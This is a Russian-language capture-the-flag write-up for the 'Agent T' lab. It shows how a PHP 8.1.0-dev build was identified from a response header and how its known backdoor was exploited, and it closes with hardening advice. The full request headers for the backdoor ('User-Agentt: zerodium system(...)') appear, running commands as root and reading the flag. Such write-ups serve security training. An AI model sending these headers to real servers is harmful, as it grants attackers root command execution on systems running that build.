# Agent T — PHP 8.1.0-dev backdoor

## Разведка

Начал с перечисления портов и анализа веб-приложения. На сайте использовалась административная панель AdminLTE.

![Веб-приложение Agent T](../images/Pasted%20image%2020260701140120.png)

![Результат первичного анализа сайта](../images/Pasted%20image%2020260701140351.png)

Проверка заголовков ответа через Burp Suite показала:

```http
X-Powered-By: PHP/8.1.0-dev
```

Суффикс `-dev` оказался ключевой зацепкой. Эта скомпрометированная сборка PHP содержала backdoor, который реагировал на специальный HTTP-заголовок.

## Эксплуатация backdoor

Триггером служил заголовок `User-Agentt` с двумя буквами `t`, а ключевым словом — `zerodium`.

Для проверки выполнения команд отправил запрос:

```http
GET / HTTP/1.1
Host: 10.114.146.94
User-Agentt: zerodium system('id'); die();
```

Сервер вернул `uid=0(root)`, поэтому команда выполнялась с максимальными привилегиями.

Проверил содержимое текущей директории:

```http
User-Agentt: zerodium system('ls'); die();
```

## Получение флага

Так как выполнение происходило от root, прочитал файл в корневом каталоге:

```http
User-Agentt: zerodium system('cat /flag.txt'); die();
```

Результат:

```text
flag{4127d0530abf16d6d23973e3df8dbecb}
```

## Рекомендации

- Не использовать development-сборки PHP в production.
- Обновить PHP до стабильной поддерживаемой версии.
- Не раскрывать точную версию PHP через `X-Powered-By` (`expose_php = Off`).
- Проверять целостность пакетов и исходного кода перед развёртыванием.
